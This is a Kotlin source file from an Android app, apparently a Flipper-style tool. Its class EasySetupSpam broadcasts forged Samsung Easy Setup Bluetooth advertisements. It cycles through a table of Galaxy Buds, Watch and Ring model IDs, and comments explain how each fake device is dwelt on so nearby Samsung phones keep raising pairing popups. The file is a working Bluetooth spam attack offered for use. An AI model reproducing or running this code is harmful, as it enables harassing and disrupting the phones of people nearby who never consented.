package com.droid.flippy

import android.util.Log
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class EasySetupSpam(private val type: EasySetupDevice.Type) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null

    val devices: Array<EasySetupDevice>

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    companion object {
        private const val TAG = "EasySetupSpam"
        private const val DWELL_MS = 2_500L
        private const val GAP_MS = 500L
        private const val COMPANY_ID = 0x0075
        private const val BUDS_SCAN_RESPONSE_HEX = "0000000000000000000000000000"
    }

    init {
        devices = when (type) {
            EasySetupDevice.Type.BUDS -> arrayOf(
                EasySetupDevice("0xEE7A0C", "Fallback Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x9D1700", "Fallback Dots", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x39EA48", "Light Purple Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xA7C62C", "Bluish Silver Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x850116", "Black Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3D8F41", "Gray & Black Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3B6D02", "Bluish Chrome Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xAE063C", "Gray Beige Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xB8B905", "Pure White Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xEAAA17", "Pure White Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xD30704", "Black Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x9DB006", "French Flag Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x101F1A", "Dark Purple Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x859608", "Dark Blue Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x8E4503", "Pink Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x2C6740", "White & Black Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3F6718", "Bronze Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x42C519", "Red Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xAE073A", "Black & White Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x011716", "Sleek Black Buds2", EasySetupDevice.Type.BUDS)
            )
            EasySetupDevice.Type.WATCH -> arrayOf(
                EasySetupDevice("0x1A", "Fallback Watch", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x01", "White Watch4 Classic 44m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x02", "Black Watch4 Classic 40m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x03", "White Watch4 Classic 40m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x04", "Black Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x05", "Silver Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x06", "Green Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x07", "Black Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x08", "White Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x09", "Gold Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0A", "French Watch4", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0B", "French Watch4 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0C", "Fox Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x11", "Black Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x12", "Sapphire Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x13", "Purplish Watch5 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x14", "Gold Watch5 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x15", "Black Watch5 Pro 45mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x16", "Gray Watch5 Pro 45mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x17", "White Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x18", "White & Black Watch5", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1B", "Black Watch6 Pink 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1C", "Gold Watch6 Gold 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1D", "Silver Watch6 Cyan 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1E", "Black Watch6 Classic 43m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x20", "Green Watch6 Classic 43m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x30", "Black Galaxy Watch7 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x31", "Green Galaxy Watch7 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x32", "Cream Galaxy Watch7 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x33", "Green Galaxy Watch7 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x34", "White Galaxy Watch7 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x35", "Black Galaxy Watch7 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x40", "Titanium White Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x41", "Titanium Black Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x42", "Titanium Silver Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x60", "Black Galaxy Ring", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x61", "Gold Galaxy Ring", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x62", "Silver Galaxy Ring", EasySetupDevice.Type.WATCH)
            )
        }
    }

    override fun start() {
        executor.execute {
            if (devices.isEmpty()) {
                Log.w(TAG, "No EasySetup devices for mode $type")
                executor.shutdown()
                return@execute
            }
            isSpamming = true
            val bluetoothAdvertiser = BluetoothAdvertiser()
            // Dwell pattern (same reason as Apple/Windows): hold ONE model
            // stable so the target can raise the popup, then a short gap.
            // Legacy fast path (not extended): the old extended path
            // silently dropped the buds scan response and most Galaxy
            // phones scan the legacy primary channels.
            val order = devices.toList().shuffled(rand)
            var index = 0
            try {
                var loop = 0
                while (isSpamming && loop <= Helper.MAX_LOOP) {
                    val device = order[index]
                    index = (index + 1) % order.size
                    val payload =
                        Helper.convertHexToByteArray(device.toManufacturerData())
                    val scan: ByteArray? =
                        if (device.deviceType == EasySetupDevice.Type.BUDS) {
                            Helper.convertHexToByteArray(BUDS_SCAN_RESPONSE_HEX)
                        } else {
                            null
                        }
                    val dwellEnd = android.os.SystemClock.elapsedRealtime() + DWELL_MS
                    while (isSpamming && android.os.SystemClock.elapsedRealtime() < dwellEnd) {
                        try {
                            bluetoothAdvertiser.advertiseSamsung(payload, scan)
                        } catch (e: Exception) {
                            Log.w(TAG, "advertise: ${e.message}")
                        }
                        blinkRunnable?.run()
                        com.droid.flippy.trackBlePackets(1)
                        try {
                            Thread.sleep(Helper.delay.coerceIn(20, 60).toLong())
                        } catch (_: InterruptedException) {
                            break
                        }
                        loop++
                        if (loop > Helper.MAX_LOOP) break
                    }
                    if (!isSpamming) break
                    try {
                        bluetoothAdvertiser.stopSamsung()
                    } catch (_: Exception) {
                    }
                    try {
                        Thread.sleep(GAP_MS)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            } finally {
                bluetoothAdvertiser.stopSamsung()
                isSpamming = false
                executor.shutdown()
            }
        }
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}

